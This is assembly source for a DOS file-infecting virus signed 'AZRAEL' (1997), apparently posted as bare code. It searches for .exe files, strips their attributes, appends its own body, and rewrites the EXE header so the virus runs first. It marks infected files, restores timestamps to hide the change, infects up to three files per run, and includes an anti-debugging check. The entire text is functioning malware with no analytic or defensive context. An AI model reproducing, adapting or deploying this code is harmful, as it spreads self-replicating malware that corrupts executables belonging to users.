start:
call delta
delta:
pop bp
sub bp,offset delta

mov ax,0faceh
push ax
pop ax
cli
dec sp
dec sp
sti
pop bx
cmp bx,ax
je its_ok

mov ax,4c00h
int 21h

its_ok:
mov word ptr[bp+saved_ds],ds

push cs
push cs
pop ds
pop es

lea si,[bp+old_ip]
lea di,[bp+original_ip]
mov cx,4
rep movsw

mov ah,1ah
lea dx,[bp+ende]
int 21h

mov ah,4eh
lea dx,[bp+file_spec]
mov cx,7
find_next:
int 21h
jc before_restore

mov ax,4300h
lea dx,[bp+ende+1eh]
int 21h

mov word ptr[bp+attribs],cx

mov ax,4301h
xor cx,cx
lea dx,[bp+ende+1eh]
int 21h

lea dx,[bp+ende+1eh]
call open

mov bx,ax

mov ax,5700h
int 21h
mov word ptr[bp+time],cx
mov word ptr[bp+date],dx

mov cx,1ah
lea dx,[bp+exe_header]
call read

cmp word ptr [bp+exe_header],'ZM'
je check_infected
cmp word ptr [bp+exe_header],'MZ'
je check_infected
jmp close

check_infected:
cmp word ptr [bp+exe_header+12h],'V'
je close

call save_exe_header

mov al,02
call seek

mov word ptr[bp+file_size_ax],ax
mov word ptr[bp+file_size_dx],dx

call calculate_new_cs_ip

mov ax,word ptr[bp+file_size_ax]
mov dx,word ptr[bp+file_size_dx]

call calculate_new_size

push byte ptr [bp+counter]
mov byte ptr[bp+counter],0

jmp goon

before_restore:
jmp restore

goon:
mov cx,ende-start
lea dx,[bp+start]
call write

pop byte ptr [bp+counter]

mov al,0
call seek

mov cx,1ah
lea dx,[bp+exe_header]
call write

inc byte ptr[bp+counter]



close:

mov ax,5701h
mov cx,word ptr[bp+time]
mov dx,word ptr[bp+date]
int 21h

mov ah,3eh
int 21h

mov ax,4301h
lea dx,[bp+ende+1eh]
mov cx,word ptr[bp+attribs]
int 21h


cmp byte ptr[bp+counter],3
je restore


mov ah,4fh
jmp find_next



restore:

mov ax,word ptr[bp+saved_ds]
mov ds,ax

mov ah,1ah
mov dx,80h
int 21h

push ds
pop es

        mov     ax,es
        add     ax,10h           ;add ajustment for PSP

        add     word ptr cs:[original_CS+bp],ax ;Adjust old CS by
                                             ;current seg
        cli
        add     ax,word ptr cs:[bp+original_SS] ;Adjust old SS
        mov     ss,ax                        ;Restore stack to
        mov     sp,word ptr cs:[bp+original_SP] ;original position
        sti


db 0eah
original_ip     dw ?
original_cs     dw ?
original_sp     dw ?
original_ss     dw ?

                                ;*****************;
                                ; SUB - FUNCTIONS ;
                                ;*****************;
save_exe_header:
push word ptr[bp+exe_header+0eh]
pop word ptr[bp+old_ss]
push word ptr[bp+exe_header+10h]
pop word ptr[bp+old_sp]
push word ptr[bp+exe_header+14h]
pop word ptr[bp+old_ip]
push word ptr[bp+exe_header+16h]
pop word ptr[bp+old_cs]
ret

calculate_new_cs_ip:
        mov     ax,word ptr [exe_header+bp+8]   ;Get header length
        mov     cl,4                            ;and convert it to
        shl     ax,cl                           ;bytes.
        mov     cx,ax
        mov ax,word ptr[bp+file_size_ax]

        sub     ax,cx                           ;Subtract header
        sbb     dx,0                            ;size from file
                                                ;size for memory
                                                ;adjustments

        mov     cl,0ch                           ;Convert DX into
        shl     dx,cl                           ;segment Address
        mov     cl,4
        push    ax                      ;Change offset (AX) into
        shr     ax,cl                   ;segment, except for last
        add     dx,ax                   ;digit.  Add to DX and
        shl     ax,cl                   ;save DX as new CS, put
        pop     cx                      ;left over into CX and
        sub     cx,ax                   ;store as the new IP.
        mov     word ptr [exe_header+bp+14h],cx
        mov     word ptr [exe_header+bp+16h],dx  ;Set new CS:IP
        mov     word ptr [exe_header+bp+0eh],dx  ;Set new SS = CS
        mov     word ptr [exe_header+bp+10h],0fffe ;Set new SP
        mov     byte ptr [exe_header+bp+12h],'V' ;mark infection
ret

calculate_new_size:
        add     ax,ende-start      ;Add virus size to DX:AX
        adc     dx,0

        mov     cl,7
        shl     dx,cl                   ;convert DX to pages
        mov     cl,9
        shr     ax,cl
        add     ax,dx
        inc     ax
        mov     word ptr [exe_header+bp+04],ax  ;save # of pages

        mov ax,word ptr[bp+file_size_ax]

        mov     dx,ax
        shr     ax,cl                           ;Calc remainder
        shl     ax,cl                           ;in last page
        sub     dx,ax
        mov     word ptr [exe_header+bp+02],dx ;save remainder
ret

seek:
mov ah,42h
xor cx,cx
xor dx,dx
int 21h
ret

read:
mov ah,3fh
int 21h
ret

write:
mov ah,40h
int 21h
ret

open:
mov ax,3d02h
int 21h
ret

saved_ds dw ?
exe_header      db 1ah dup(?)
old_ip  dw 0
old_cs  dw 0fff0h
old_sp  dw 0
old_ss  dw 0fff0h
file_spec db '*.exe',0
file_size_ax dw ?
file_size_dx dw ?
attribs dw ?
time dw ?
date dw ?
counter db 0
copyright db 'AZRAEL / Copyright by Spo0ky / Austria 1997',0
ende:
